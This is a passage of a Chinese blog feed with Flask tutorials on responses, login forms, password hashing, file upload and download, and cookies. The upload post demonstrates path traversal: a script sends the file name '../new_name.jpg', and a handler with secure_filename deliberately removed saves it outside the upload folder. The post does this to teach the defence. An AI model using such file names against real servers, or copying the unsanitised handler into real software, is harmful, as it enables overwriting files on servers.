<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/image&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">image</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;static/public/pic/coolpython.png&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    resp = Response(f.read(), mimetype=<span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>

<p>若不直接创建Response对象，那么你就无法设置mimetype首部</p>
<h2 id="3-自定义Response"><a href="#3-自定义Response" class="headerlink" title="3. 自定义Response"></a>3. 自定义Response</h2><p>也可自定义Response类，进行个性化的处理，但这个类必须继承Response</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ImageResponse</span>(<span class="title class_ inherited__">Response</span>):</span><br><span class="line">    default_mimetype = <span class="string">&#x27;image/jpeg&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/image&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">image</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;static/public/pic/coolpython.png&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    resp = ImageResponse(f.read())</span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>

<p>上面定义的ImageResponse类里，default_mimetype 就是image&#x2F;jpeg， 因此在视图中创建ImageResponse对象时无需再设置mimetype。</p>
<h2 id="4-替换response-class"><a href="#4-替换response-class" class="headerlink" title="4. 替换response_class"></a>4. 替换response_class</h2><p>flask对象有一个response_class属性，默认是Response，可以将其替换成自定义的响应类。</p>
<p>假设需要实现一个图片服务，返回的数据都是图片，mimetype都是image&#x2F;jpeg，那么可以这样做</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ImageResponse</span>(<span class="title class_ inherited__">Response</span>):</span><br><span class="line">    default_mimetype = <span class="string">&#x27;image/jpeg&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.response_class = ImageResponse</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/image&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">image</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;static/public/pic/coolpython.png&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br></pre></td></tr></table></figure>

<p>在image函数，直接返回从图片中读取的数据返回，这些数据最终会被ImageResponse类处理。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask[相逢]</title>
    <url>/2023/07/06/2023-7-6-Flask-5/</url>
    <content><![CDATA[<h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><p>用户使用表单向服务器提交信息，例如最常见的登录。</p>
<p>那么如何在html页面里提交表单，以及flask如何处理表单数据？以及表单敏感信息如何存储。</p>
<p>HTML登录页面中的form表单</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>action 设置提交的url</li>
<li>method 设置请求的方法</li>
<li>input标签的type设置为password时，在页面输入信息时不会显示明文</li>
</ul>
<p>服务端接收表单信息的方式如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        name = request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&#x27;python&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>通过request.form来获取表单信息，然后对用户输入的用户名和密码做校验。为了演示，这里省去了数据库查询的逻辑，简化了过程。</p>
<p>生产环境下，用户的密码也并不是明文存储，例子注册网站账号时，填写的密码是888888，网站不会明文存储这个密码，简易的方法为存储它的md5值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">password = <span class="string">&#x27;888888&#x27;</span></span><br><span class="line">bpwd = <span class="built_in">bytes</span>(password, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(bpwd)</span><br><span class="line"></span><br><span class="line">md5_pwd = m.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(md5_pwd)</span><br></pre></td></tr></table></figure>

<p>888888的md5值是 21218cca77804d2ba1922c33e0151105，这样，即便你在数据库里看到这个数值，你也不知道它真实的密码是什么。</p>
<blockquote><p>关于md5：md5并非加密算法，而是密码散列函数，它是一种单向函数，也就是说极其难以由散列函数输出的结果，回推输入的数据是什么，但是同一个值经过md5计算后的值是不会发生变化的。</p>
<p>这样，你只要记住21218cca77804d2ba1922c33e0151105是888888的md5值，就可以对user表进行撞库处理了。</p>
<p>关于网上所谓的md5解密，其实就是事先掌握了海量的密码和与之对应的md5值，然后通过md5反向查找原始密码。</p>
<p>md5值作为密码不够安全，你可以使用werkzeug.security模块里的generate_password_hash和check_password_hash函数。</p>
<p>generate_password_hash是密码加盐哈希函数，对同一个密码，每一次加密都会得到不同的值。generate_password_hash是密码验证函数，而并非计算出原始密码。</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>



<p>下面是一段示例代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> generate_password_hash, check_password_hash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对密码进行加密</span></span><br><span class="line">password = generate_password_hash(<span class="string">&quot;888888&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查密码是否正确</span></span><br><span class="line">result = check_password_hash(password, <span class="string">&#x27;888888&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>多次运行你就会发现，每次得到的password都是不同的，但是check_password_hash都能正确验证。</p>
<p>使用这两个函数，就绝对能够防止破解了么？并非如此，黑客还是可以在得到user表后进行暴力破解，但是暴力破解的难度和成本都增加了。</p>
<p>888888经过generate_password_hash函数处理后，会得到无数种加密结果，因此，就无法维护一个加密结果与原始密码的映射表，当你拿到一个加密后的密码后，你当然可以使用check_password_hash(password, ‘888888’)来判断这个密码是不是888888加密后的结果。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask[接洽]</title>
    <url>/2023/07/06/2023-7-6-Flask-6/</url>
    <content><![CDATA[<h1 id="Flask上传文件"><a href="#Flask上传文件" class="headerlink" title="Flask上传文件"></a>Flask上传文件</h1><p>文件上传功能需要学习的范围：</p>
<ul>
<li>文件类型，大小限制</li>
<li>多文件上传</li>
<li>文件名称安全检查</li>
</ul>
<h2 id="1-文件大小限制"><a href="#1-文件大小限制" class="headerlink" title="1.文件大小限制"></a>1.文件大小限制</h2><p>出于资源考虑，需要对用户上传的文件大小进行限制</p>
<p>flask中的实现代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br></pre></td></tr></table></figure>

<p>此代码的作用是阻止超过16M大小的文件上传
如果使用nginx为你的flask服务做反向代理，那么nginx也需要进行配置，将nginx client_max_body_size 修改为合适的数值，该值默认是1M</p>
<h2 id="2-文件类型检查"><a href="#2-文件类型检查" class="headerlink" title="2. 文件类型检查"></a>2. 文件类型检查</h2><p>如果希望用户只上传jpg类型的图片，那么最简单的办法是对用户的文件名称后缀做检查</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;jpg&#x27;</span>])</span><br><span class="line">file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断文件类型是否符合要求</span></span><br><span class="line">file_ok = allowed_file(file.filename)</span><br></pre></td></tr></table></figure>

<p>此方法完全依赖用户上传的文件名称，无法应对简单的修改后缀名实现上传。</p>
<p>更准确稳妥的方法是通过检查文件内容来判断文件类型：</p>
<blockquote><p>python中有一个filetype库可以根据文件内容对文件类型进行判断，其原理是读取文件的前262字节的内容，而不同类型的文件拥有独特的文件头，关于文件头可以查阅这篇文章 https:&#x2F;&#x2F;blog.csdn.net&#x2F;xiangshangbashaonian&#x2F;article&#x2F;details&#x2F;80156865 ，filetype正是利用了不同文件头的内容不同进而判断一个文件的类型，下面是一段示例代码</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> filetype</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kind = filetype.guess(<span class="string">&#x27;1.jpeg&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;File extension: %s&#x27;</span> % kind.extension)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;File MIME type: %s&#x27;</span> % kind.mime)</span><br></pre></td></tr></table></figure>

<h2 id="3-文件上传示例"><a href="#3-文件上传示例" class="headerlink" title="3. 文件上传示例"></a>3. 文件上传示例</h2><p>常规上传操作示例</p>
<h3 id="upload-html"><a href="#upload-html" class="headerlink" title="upload.html"></a>upload.html</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;uploadfile&quot;</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">enctype</span>=<span class="string">multipart/form-data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">name</span>=<span class="string">file</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Upload</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>处理文件上传的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;pdf&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;./upload&#x27;</span> <span class="comment"># 保存文件的路径，需要手动创建这个文件夹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/uploadfile&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="comment"># filename = file.filename</span></span><br><span class="line">            file.save(os.path.join(UPLOAD_FOLDER, filename))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>) <span class="comment"># 模板文件需要存在template文件夹里</span></span><br></pre></td></tr></table></figure>

<p>启动服务后，在浏览器里输入 http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;uploadfile ,然后选择一个文件并点击upload按钮，就完成一次上传，你可以在项目的upload文件夹中找到你上传的文件</p>
<h2 id="4-文件名称安全检查"><a href="#4-文件名称安全检查" class="headerlink" title="4. 文件名称安全检查"></a>4. 文件名称安全检查</h2><blockquote><p>黑客们会通过修改上传文件的名称来达到修改文件存储位置的目的，如此一来就可以覆盖掉你服务器上的一个文件，这是十分危险的事情。</p>
<p>使用页面的表单进行文件上传，你在服务端获得文件名字就是你上传的文件名字，但黑客可以直接向你的服务器发送文件上传的请求，进而绕过网页提交，这时，他就可以修改上传文件的名字了。</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<p>使用requests上传文件并制定文件名称</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:5000/uploadfile&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;1.jpeg&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;../new_name.jpg&#x27;</span>, file)&#125;</span><br><span class="line">response = requests.post(url, files=files)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>接下来，你需要修改第3节中的do_upload函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/uploadfile&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="comment"># filename = secure_filename(file.filename)</span></span><br><span class="line">            filename = file.filename</span><br><span class="line">            file.save(os.path.join(UPLOAD_FOLDER, filename))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>将原本使用secure_filename函数对文件名称做处理，改为直接使用file.filename</p>
<p>执行上传脚本发现，结果是存储到了upload的上一层文件夹中</p>
<p> <code>files = &#123;&#39;file&#39;: (&#39;../new_name.jpg&#39;, file)&#125;</code></p>
<p>原因为不使用secure_filename函数，filename的值就是上传脚本里设置的值 “..&#x2F;new_name.jpg”</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.path.join(UPLOAD_FOLDER, filename)</span><br></pre></td></tr></table></figure>

<p>使用join函数得到的结果就是”.&#x2F;upload&#x2F;..&#x2F;new_name.jpg”,连续两个点表示跳跃到上一层目录，因此，文件就保存到了upload的上一层目录。</p>
<p>因此直接使用filename存在一定的缺陷，而使用secure_filename函数处理文件名称，则可以获得安全的文件名称。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(secure_filename(<span class="string">&#x27;../new_name.jpg&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="5-flask多文件上传"><a href="#5-flask多文件上传" class="headerlink" title="5. flask多文件上传"></a>5. flask多文件上传</h2><p>多文件上传，仅需要在form表单里增加一个file标签即可</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;uploadfile&quot;</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">enctype</span>=<span class="string">multipart/form-data</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">name</span>=<span class="string">file</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">name</span>=<span class="string">file</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Upload</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>服务端的处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_lst = request.files.getlist(<span class="string">&#x27;file&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>file_lst 存储的是上传的所有文件数据，剩下的，仅需要写一个for循环即可处理</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask[邂逅]</title>
    <url>/2023/07/06/2023-7-6-Flask-7/</url>
    <content><![CDATA[<h1 id="flask-下载文件"><a href="#flask-下载文件" class="headerlink" title="flask 下载文件"></a>flask 下载文件</h1><p>flask提供了两个可进行下载的函数：send_from_directory 和 send_file</p>
<h2 id="send-from-directory"><a href="#send-from-directory" class="headerlink" title="send_from_directory"></a>send_from_directory</h2><p>send_from_directory函数内部调用了send_file，可以认为，真正执行下载操作的其实是send_file，那么send_from_directory存在的意义是什么呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_from_directory</span>(<span class="params">directory, filename, **options</span>):</span><br><span class="line">    filename = safe_join(directory, filename)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isabs(filename):</span><br><span class="line">        filename = os.path.join(current_app.root_path, filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filename):</span><br><span class="line">            <span class="keyword">raise</span> NotFound()</span><br><span class="line">    <span class="keyword">except</span> (TypeError, ValueError):</span><br><span class="line">        <span class="keyword">raise</span> BadRequest()</span><br><span class="line">    options.setdefault(<span class="string">&#x27;conditional&#x27;</span>, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> send_file(filename, **options)</span><br></pre></td></tr></table></figure>

<p>上面为send_from_directory函数的全部代码，在调用send_file函数之前，它做的最重要的事情就是获得一个安全的filename。</p>
<blockquote><p>下载文件的名字，为用户发请求时传给后端的，如果直接使用客户端发送的文件名字，则存在安全隐患。</p>
<p>关于这个安全隐患，其本质都是利用地址拼接这个动作修改实际操作文件的地址，为了防止黑客恶意下载，函数第一行代码便是使用safe_join函数，防止黑客通过修改filename的值达到下载关键文件的目的。</p>
<p>因此，实际生产环境下，推荐使用send_from_directory函数</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<h2 id="send-file"><a href="#send-file" class="headerlink" title="send_file"></a>send_file</h2><p>使用send_file例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> send_from_directory, send_file</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;./data/3.xlsx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>send_file函数会调用guess_type函数获取文件的类型，设置响应头里的content-type。</p>
<p>在浏览器里打开 http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;download 这个url，会直接进行下载，但下载的文件名字并不是所期望的3.xlsx，浏览器在保存时用的名字是download.xlsx。 </p>
<p>如果希望浏览器下载保存文件时使用的名字是3.xlsx,则需要将参数as_attachment设置为True。</p>
<p>秘密藏在响应头的首部中，由于设置了as_attachment为True，flask会添加Content-Disposition</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Content-Disposition: attachment; filename=3.xlsx</span><br></pre></td></tr></table></figure>

<p>这样，浏览器便明白文件名是什么。</p>
<p>如果希望浏览器以其他的名字保存该文件，则可以单独设置attachment_filename 参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;./data/3.xlsx&#x27;</span>,</span><br><span class="line">                     as_attachment=<span class="literal">True</span>,</span><br><span class="line">                     attachment_filename=<span class="string">&#x27;test.xlsx&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这样，浏览器就会使用test.xlsx来保存文件。</p>
<h2 id="处理下载文件中出现中文的乱码问题"><a href="#处理下载文件中出现中文的乱码问题" class="headerlink" title="处理下载文件中出现中文的乱码问题"></a>处理下载文件中出现中文的乱码问题</h2><p>当attachment_filename参数设置为中文文件名时，flask会报错误</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">UnicodeEncodeError: &#x27;latin-1&#x27; codec can&#x27;t encode characters in position 43-44: ordinal not in range(256)</span><br></pre></td></tr></table></figure>

<p>引发这个问题的原因，可以一直追溯到http协议，按照协议规定，HTTP Header 中的文本数据必须是 ASCII 编码的，为了解决header出现其他编码的问题，浏览器各显神通，这里的原理与历史可以参考这篇文章
 https:&#x2F;&#x2F;blog.csdn.net&#x2F;u011090495&#x2F;article&#x2F;details&#x2F;18815777</p>
<p>我这里直接给出解决办法 <code>COOLPYTHON NB</code> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    filename = quote(<span class="string">&quot;测试表格.xlsx&quot;</span>)</span><br><span class="line">    rv = send_file(<span class="string">&#x27;./data/3.xlsx&#x27;</span>,</span><br><span class="line">                     as_attachment=<span class="literal">True</span>,</span><br><span class="line">                     attachment_filename=filename)</span><br><span class="line"></span><br><span class="line">    rv.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] += <span class="string">&quot;; filename*=utf-8&#x27;&#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename)</span><br><span class="line">    <span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask[携行]</title>
    <url>/2023/07/07/2023-7-7-Flask-10/</url>
    <content><![CDATA[<h1 id="flask-设置cookie过期时间"><a href="#flask-设置cookie过期时间" class="headerlink" title="flask 设置cookie过期时间"></a>flask 设置cookie过期时间</h1><p>如果不设置cookie的过期时间，则默认关闭浏览器时cookie过期。</p>
<p>flask设置过期时间，遵循下面的三条规则：</p>
<ol>
<li>max_age: 规定多少秒以后过期</li>
<li>expires：datatime类型，使用此参数，需参照格林尼治时间，即北京时间-8个小时</li>
<li>如果max_age和expires都设置，则以max_age为主</li>
</ol>
<p>设置了cookie过期时间，即便浏览器都关闭了，只要没有cookie还在有效期内，再次打开浏览器，cookie依然有效。</p>
<p>如果超过了cookie的过期时间，即便浏览器没有关闭，cookie也会失效。</p>
<p>只要设置了cookie的过期时间，是否失效就已经和浏览器是否关闭无关。</p>
<h2 id="1-通过max-age设置cookie有效期"><a href="#1-通过max-age设置cookie有效期" class="headerlink" title="1. 通过max_age设置cookie有效期"></a>1. 通过max_age设置cookie有效期</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 尝试获取 first_access cookie</span></span><br><span class="line">    first_access = request.cookies.get(<span class="string">&#x27;first_access&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> first_access <span class="keyword">is</span> <span class="literal">None</span>:        <span class="comment"># 没有first_access cookie， 是第一次来</span></span><br><span class="line">        first_access = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">        res = make_response(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;first_access&#x27;</span>, first_access, max_age=<span class="number">60</span>)        <span class="comment"># 在响应头里设置cookie</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:       <span class="comment"># 不是第一次来</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;你第一次访问这个网页的时间是: <span class="subst">&#123;first_access&#125;</span>&quot;</span></span><br><span class="line"></span><br><span 